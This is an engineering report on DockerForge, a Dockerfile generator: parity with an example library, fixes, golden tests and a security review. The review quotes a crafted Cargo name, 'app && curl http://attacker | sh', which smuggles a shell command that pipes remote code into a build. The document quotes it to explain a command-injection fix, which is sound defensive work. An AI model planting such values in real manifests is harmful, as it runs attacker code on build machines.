# DockerForge — example-parity report

How the generator's output compares to the curated example library in
`Apps/dockerfile-builder/docs/dockerfile-examples`, what this session changed, and the
remaining opinion-level deltas a maintainer should decide on.

Scope of this session: **polish the existing stacks** (Node, Python, Go, Rust, .NET) and lock
them behind **golden tests vs the examples**. Java, Ruby, and PHP are not yet generated and are
out of scope here.

Verification used: the full unit suite (`node --test`, now **47 tests, all green** — 25 original,
7 golden+parity, 4 unsupported-language, 2 injection-security, 9 CLI) plus `hadolint` run over every generated Dockerfile
(clean at the error threshold; only the same version-pin *warnings* the example library itself
carries). Real `docker build` was not available in this environment — run the builds host-side to
confirm first-time success.

## What this session changed

### 1. FastAPI / Flask source copy — build-breaker fixed
Previously the non-Django Python path emitted `COPY <entryPoint> ./`, where `entryPoint` was just
a basename. For the standard package layout (`app/main.py`, started as `uvicorn app.main:app`)
this produced `COPY main.py ./` — a file that does not exist at the project root, so the build
failed on that line, and even if it had not, the `app/` package was never copied into the image.

The analyser now detects the real top-level Python packages and root modules
(`findPythonSourceDirs`), and the generator copies them: `COPY app/ ./app/`. This matches the
`python/fastapi-pip` example.

Files: `engine/analysis/analyser.js`, `engine/generation/generator.js`.

### 2. Node redundant entry-file copy removed
A Node app with `src/server.js` produced both `COPY src/server.js ./` (dropping the file at
`/app/server.js`, where nothing reads it) and `COPY src/ ./src/`. The first copy is now skipped
when the file already lives inside a copied source directory, matching `node/express-api`.

File: `engine/generation/generator.js`.

### 3. Graceful handling of unsupported languages
The analyser used to throw a bare `Error` with a stale message ("Node.js, Python, .NET" — no Go or
Rust) when it found no supported stack. It now throws the typed `UnsupportedStackError`
(code `UNSUPPORTED_STACK`), and when it recognises the language it names it: a Ruby, Java, PHP,
Elixir, Scala, Swift, Dart/Flutter, or Deno project gets a message like *"Detected a Ruby project,
which DockerForge does not generate Dockerfiles for yet. Supported stacks: Node.js, Python, .NET,
Go, and Rust."* Anything else gets a clear generic message listing the supported manifests. The CLI
already prints typed errors cleanly and exits non-zero, so users get a friendly message, never a
stack trace.

Files: `engine/analysis/analyser.js` (uses the existing `errors.UnsupportedStackError`).

### 4. All supported stacks audited
Every supported-stack fixture (Node npm/yarn/vite/nestjs/next, Python pip/django/fastapi, .NET, Go,
Rust) was generated and linted with `hadolint`: **zero error-level findings** across all of them
(only the same version-pin warnings the example library itself carries). .NET now has its own golden
fixture and parity case, so all five supported stacks are locked.

### 5. Golden + parity test harness added
`test/golden.test.js` runs the engine against realistic fixtures that mirror the example layouts
(`test/golden-fixtures/`) and checks two things per fixture: a byte-for-byte snapshot
(`test/golden-snapshots/`, regenerate with `DOCKERFORGE_UPDATE_GOLDENS=1`) and "works first time"
invariants drawn from the example baseline — pinned base image (never `:latest`), explicit COPYs
(never `COPY . .`), a non-root final `USER`, lockfile-first install, and the correct entrypoint.

## Security review

A top-to-bottom read of the engine (`analyser`, `generator`, `security`, `lint/rules`,
`composeGenerator`). Findings:

**Fixed this session — command injection (was the one real issue).** Project-controlled names —
a Cargo crate name (`Cargo.toml` `name = "..."`) and a Go module path / `cmd/` dir — were
interpolated unsanitized into shell-form `RUN` lines. A crafted manifest such as
`name = "app && curl http://attacker | sh"` produced a Dockerfile that ran that command at
`docker build` time. The analyser now restricts these tokens to `[A-Za-z0-9._-]` (`safeToken` /
`safeGoBuildTarget`) and falls back to `app` / `.` with an assumption when they don't match. Valid
Cargo/Go names already satisfy this, so real projects are unaffected. Regression test:
`test/injection.test.js`.

**Already solid (verified, no change needed):**

- **No `COPY . .`** anywhere — every stack copies explicit manifests, lockfiles and source dirs,
  so `.git`/`.env`/secrets never enter the context. Lint rule **DF003** also flags it in user files.
- **Secrets never baked.** `buildEnvBlock` only emits env defaults from `.env.example`/`.env.sample`
  (never the real `.env`) and filters secret-like keys/values. Compose uses required-variable
  syntax (`${VAR:?...}`) instead of literals. Lint rule **DF005** flags hardcoded ENV/ARG secrets.
- **Non-root by default** in every final stage; pinned base images (no `:latest`); private-registry
  creds use a BuildKit `--mount=type=secret` (an `.npmrc` is never copied into a layer).
- **Self-audit pass** (`securityPass`) re-checks the generated Dockerfile for root, `:latest`,
  ENV secrets, missing `.dockerignore` `.env`, and `curl | sh`.

**Residual / lower-priority hardening (not blocking):**

- .NET project name/path comes from the `.csproj` filename and is interpolated into a quoted `RUN`
  and exec arrays. Filesystem rules make a malicious filename unlikely, but applying the same
  `safeToken` guard there would close the gap fully.
- The Compose file echoes `.env.example` values into `environment:` without the secret filter the
  Dockerfile path uses. Values there are placeholders, but adding the same filter is tidier.

## Stack-by-stack parity

| Stack | Matches the example on | Opinion-level delta vs example |
| --- | --- | --- |
| **Node (express)** | non-root user, prod-only install, explicit `src/` copy, correct `CMD` | example uses a 2-stage `deps`+`runtime` split and the built-in `node` user; generator runs `npm ci --omit=dev` in a single runtime stage and creates its own `appuser` |
| **Node (typescript)** | multi-stage, `npm run build`, ships `dist/`, correct `CMD` | example uses a dedicated `prod-deps` stage; generator installs all deps then `npm prune --omit=dev` in the builder (works, slightly less cache-friendly) |
| **Python (fastapi/django)** | venv built in a builder, venv copied to a slim runtime, explicit package copies, correct `uvicorn`/`gunicorn` target, non-root | example pins patch tags and omits the healthcheck; generator adds neither here for Python |
| **Go** | toolchain build → tiny runtime, `CGO_ENABLED=0`, builds `./cmd/...`, copies `cmd/`+`internal/`, ca-certs, non-root, binary entrypoint | no `scratch`/distroless variant yet (example `go/static-scratch`); cache mounts stripped from the default output |
| **Rust** | `cargo build --release --locked`, debian-slim runtime, ca-certs, non-root, binary entrypoint | registry cache mount only in the "power" output; no musl/scratch variant (example `rust/cli-binary`) |
| **.NET** | SDK restore → publish → aspnet/runtime, non-root, correct entrypoint | `USER` is set before the final `COPY` (works, since `COPY` runs as root); example uses the built-in `app` user with `COPY --chown` |

## Opinion-level deltas to decide on (not bugs)

These are deliberate choices where the generator and the examples differ. They do not break the
build; they are calls for the maintainer.

1. **Image pinning.** Generator floats the minor tag (`node:22-alpine3.21`, `python:3.12-slim`,
   `golang:1.23-alpine3.21`, `rust:1.83-slim-bookworm`). Examples pin the patch
   (`node:22.11.0-alpine3.20`). Floating picks up security patches automatically but is less
   reproducible. Recommendation: keep floating in the default output, resolve a digest in the
   "power"/production output.
2. **HEALTHCHECK.** Generator adds one for Node/Python web apps, probing `/health`. Examples omit
   it. The healthcheck is good practice but assumes a `/health` route exists. Recommendation:
   keep it, but make the path configurable via a hint.
3. **User model.** Generator always creates `appuser`. Where the base image ships a non-root user
   (`node`, dotnet `app`, php `www-data`) the examples reuse it. Recommendation: prefer the
   built-in user when present; fall back to creating one.
4. **Cache mounts & syntax.** Examples use `# syntax=docker/dockerfile:1.7` with
   `--mount=type=cache`. The generator keeps cache mounts in the "power" output and strips them
   from the default. This is intentional and fine.

## Suggested next steps

1. Adopt the dedicated `prod-deps` stage for Node TypeScript to match `node/typescript-api`.
2. Add a `scratch`/distroless runtime variant for Go and Rust (`go/static-scratch`,
   `rust/cli-binary`).
3. Prefer built-in non-root users where the base image provides them.
4. When ready to expand coverage: Java (Maven/Gradle/prebuilt-jar), Ruby (Rails/Rack/Sidekiq),
   and PHP (Laravel/Symfony/CLI), each as a verified slice with its own golden fixture.
